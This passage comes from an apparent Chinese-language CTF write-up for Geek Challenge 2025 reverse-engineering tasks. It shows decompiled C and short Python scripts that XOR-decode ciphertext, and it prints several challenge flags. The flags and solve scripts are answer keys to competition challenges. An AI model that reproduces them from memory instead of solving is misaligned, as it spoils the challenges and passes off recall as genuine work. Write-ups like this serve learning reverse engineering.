</span></span><span class="line"><span class="cl">  <span class="nf">vm_load_program</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">xor_compare_program</span><span class="p">,</span> <span class="mi">37LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">vm_run</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Success: Input matches processed string!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Failure: Input does not match.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v4</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在这里发现了点线索，大概是个异或，直接下断点动调看看密文
<img src="/p/geek-challenge-2025-wp/image-16.png"
	width="1989"
	height="1049"
	srcset="/p/geek-challenge-2025-wp/image-16_hu_6cca5fed027f9766.png 480w, /p/geek-challenge-2025-wp/image-16_hu_8bf01c42d7586dd6.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="189"
		data-flex-basis="455px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x09, 0x03, 0x19, 0x21, 0x0D, 0x69, 0x6B, 0x39, 0x6A, 0x37, 0x69, 0x05, 0x2E, 0x6A, 0x05, 0x28, 0x69, 0x1A, 0x6B, 0x05, 0x28, 0x69, 0x2C, 0x3F, 0x28, 0x29, 0x3F, 0x7B, 0x27, 0x03
</span></span></code></pre></td></tr></table>
</div>
</div><p>众所周知flag的格式是SYC{}
直接拿已知的几位和密文异或,发现结果都是90，合理猜测是密文直接xor90就能得到结果</p>
<h4 id="exp-16">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># s = &#34;SYC{&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># cipher = [0x09, 0x03, 0x19, 0x21]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># guess_key = [ord(c) ^ cipher[i] for i, c in enumerate(s)]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># print(guess_key)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="mh">0x5A</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">29</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-8">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{W31c0m3_t0_r3@1_r3verse!}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="geekbinder">GeekBinder
</h3><h4 id="解题流程-15">解题流程
</h4><p>直接把libattr.so拿ida打开</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">attr_xor_cipher</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">a2</span><span class="p">,</span> <span class="n">_QWORD</span> <span class="o">*</span><span class="n">a3</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">a4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">a1</span> <span class="o">||</span> <span class="o">!</span><span class="n">a2</span> <span class="o">||</span> <span class="o">!</span><span class="n">a3</span> <span class="o">||</span> <span class="o">!</span><span class="n">a4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">a2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v7</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">4294967294LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_1119</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">a3</span> <span class="o">=</span> <span class="n">v7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">a4</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">attr_get_hidden_cipher</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="n">_QWORD</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">a1</span> <span class="o">||</span> <span class="o">!</span><span class="n">a2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x5BuLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">4294967294LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">v3</span> <span class="o">=</span> <span class="mh">0x7C725E7310263C34LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5D666F5505541F1ELL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4601535D19153A54LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4266037034165614LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x505E5974340B0002LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5B5D536D18543A54LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5A666F4B19251713LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6A5E705F19550B38LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x651594608251717LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x506D5560340B5438LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x440555705540209LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">44</span><span class="p">)</span> <span class="o">=</span> <span class="mi">521</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">90</span><span class="p">)</span> <span class="o">=</span> <span class="mi">24</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">a1</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">a2</span> <span class="o">=</span> <span class="mi">91LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_1119</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="n">a2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a3</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">aGeek2025</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>最基础的异或加密，且key是geek2025</p>
<h4 id="exp-17">exp
</h4><p><img src="/p/geek-challenge-2025-wp/image-17.png"
	width="2495"
	height="1417"
	srcset="/p/geek-challenge-2025-wp/image-17_hu_85338e05e3b8cc98.png 480w, /p/geek-challenge-2025-wp/image-17_hu_edad3801b0696718.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="176"
		data-flex-basis="422px"
	
></p>
<h4 id="flag-9">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{An@Iyz1ng_Th3_proc3ss3s_B3Tween_File3_1s_contr@ry_To_n0rm@l_pr@ctic3_1n_Re_eng1neer1ng}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="obfuscat3">obfuscat3
</h3><h4 id="解题流程-16">解题流程
</h4><p>这题代码量很大就不全粘进来了，但总结就这个关键</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+=</span> <span class="n">mysterious_box</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)((</span><span class="kt">int</span><span class="p">)(</span><span class="n">v19</span> <span class="o">-</span> <span class="p">((</span><span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="o">~</span><span class="p">((</span><span class="n">v13</span> <span class="o">&amp;</span> <span class="mh">0x7911131C</span> <span class="o">|</span> <span class="n">mysterious_box</span><span class="p">[</span><span class="n">v21</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xE3</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x1C</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x86EEECE3</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)];</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>mysterious_box的数与密文相加,可以通过动调
<img src="/p/geek-challenge-2025-wp/image-18.png"
	width="1048"
	height="1049"
	srcset="/p/geek-challenge-2025-wp/image-18_hu_c0106765f3fa8f12.png 480w, /p/geek-challenge-2025-wp/image-18_hu_8c3c93d96a802022.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="99"
		data-flex-basis="239px"
	
>
在此处得到密文被处理后的结果</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x53, 0x59, 0x43, 0x7b, 0x41, 0x6c, 0xb3, 0x69, 
</span></span><span class="line"><span class="cl">0x67, 0x68, 0x74, 0x5f, 0x49, 0x5f, 0x73, 0x74, 
</span></span><span class="line"><span class="cl">0x69, 0x31, 0x6c, 0x5f, 0x68, 0x30, 0x70, 0x65, 
</span></span><span class="line"><span class="cl">0x5f, 0x74, 0x68, 0x33, 0x74, 0x5f, 0x79, 0x6f, 
</span></span><span class="line"><span class="cl">0x75, 0x5f, 0x73, 0x6f, 0x6c, 0x76, 0x65, 0x64, 
</span></span><span class="line"><span class="cl">0x5f, 0x74, 0xbf, 0x65, 0x5f, 0x63, 0x68, 0xb5, 
</span></span><span class="line"><span class="cl">0x6c, 0x6c, 0x33, 0x6e, 0x67, 0x65, 0x5f, 0x62, 
</span></span><span class="line"><span class="cl">0x79, 0x5f, 0x64, 0x65, 0x6f, 0x62, 0xbd, 0x75, 
</span></span><span class="line"><span class="cl">0x73, 0xba, 0x61, 0x74, 0x69, 0x6e, 0x67, 0x5f, 
</span></span><span class="line"><span class="cl">0x74, 0x68, 0x65, 0x6d, 0x5f, 0x47, 0x65, 0x65, 
</span></span><span class="line"><span class="cl">0xc1, 0x5f, 0x69, 0x73, 0x5f, 0x6a, 0x75, 0xcb, 
</span></span><span class="line"><span class="cl">0x74, 0x5f, 0x74, 0x68, 0x65, 0x5f, 0x66, 0x69, 
</span></span><span class="line"><span class="cl">0x72, 0x73, 0x74, 0x5f, 0x73, 0x74, 0x65, 0x70, 
</span></span><span class="line"><span class="cl">0x5f, 0x6f, 0x66, 0x5f, 0x79, 0x6f, 0x75, 0x72, 
</span></span><span class="line"><span class="cl">0x5f, 0x43, 0x54, 0x46, 0x5f, 0x6a, 0x6f, 0xcb, 
</span></span><span class="line"><span class="cl">0x72, 0x6e, 0x65, 0x79, 0x5f, 0x49, 0x6d, 0x5f, 
</span></span><span class="line"><span class="cl">0x67, 0x6c, 0x61, 0x64, 0x5f, 0x49, 0x5f, 0x63, 
</span></span><span class="line"><span class="cl">0x6f, 0xca, 0x6c, 0x64, 0x5f, 0x62, 0x65, 0x5f, 
</span></span><span class="line"><span class="cl">0x70, 0x61, 0x72, 0x74, 0x5f, 0x6f, 0x66, 0x5f, 
</span></span><span class="line"><span class="cl">0x79, 0x6f, 0x75, 0x72, 0x5f, 0x67, 0x72, 0x6f, 
</span></span><span class="line"><span class="cl">0x77, 0x74, 0x68, 0x5f, 0x47, 0x6f, 0x6f, 0x64, 
</span></span><span class="line"><span class="cl">0x5f, 0x6c, 0x75, 0x63, 0x6b, 0x5f, 0x66, 0x6f, 
</span></span><span class="line"><span class="cl">0x72, 0x5f, 0x79, 0x30, 0x75, 0x21, 0x7d, 0x00, 
</span></span><span class="line"><span class="cl">0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
</span></span><span class="line"><span class="cl">0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
</span></span></code></pre></td></tr></table>
</div>
</div><p>再将调试的时候中间修改的一部分改回去就行</p>
<h4 id="exp-18">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl"><span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> 
